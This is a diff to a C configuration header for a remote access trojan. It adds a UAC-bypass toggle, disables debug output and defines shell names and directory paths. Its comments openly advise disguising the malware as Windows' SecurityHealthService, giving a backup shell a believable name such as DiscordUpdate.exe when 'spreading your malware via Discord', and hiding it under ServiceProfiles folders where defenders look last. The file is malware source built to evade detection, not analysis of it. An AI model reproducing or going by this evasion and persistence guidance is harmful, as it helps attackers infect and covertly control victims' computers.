@@ -1,11 +1,16 @@
 //This file should contain various useful macros for the project, primarily interesting folders and module names
 
+#define VERSION "1.1"
+
 //Uncommenting this macro will let every module create a console useful for debugging since some modules can't be compiled in debug mode
 //such as the main loader and the shell
-#define DEBUG 
+//#define DEBUG 
 
 //Uncommenting this macro will make the loader perform auto injection instead of relying on the embedded image
 //#define SELF_INJECTION
+
+//Uncommenting this macro will enable automatic vertical elevation (UAC bypass)
+//#define BYPASS_UAC
 
 //The RAT will attempt to disguise itself as an extension of the already existing SecurityHealthService
 #define SERVICE_NAME			"WindowsHealthService"
@@ -14,6 +19,7 @@
 #define SERVICE_ARCHIVE_NAME	"external.zip"
 
 #define SHELL_NAME				"SecurityHealthService32.exe"
+#define SHELL_UPDATE_NAME		"Update.exe"
 //Backup shell should have a "realistic" name based on an application that your target "audience" will have.
 //For example if spreading your malware via Discord this could be a realistic name that no one will really look into.
 #define SHELL_BACKUP_NAME		"DiscordUpdate.exe"
@@ -23,6 +29,9 @@
 //Make sure the backup shell path is something not really "expected", and assume they will find the main shell folder first
 #define SHELL_PATH(x)			JOIN("C:\\Windows\\ServiceProfiles\\LocalService\\", x)
 #define SHELL_BACKUP_PATH(x)	JOIN("C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads\\", x)
+
+#define SHELL_DIRECTORY			"C:\\Windows\\ServiceProfiles\\LocalService"
+#define SHELL_BACKUP_DIRECTORY	"C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads"
 
 //Macros used to get the full path to both shells
 #define SHELL_EXE				SHELL_PATH(SHELL_NAME)
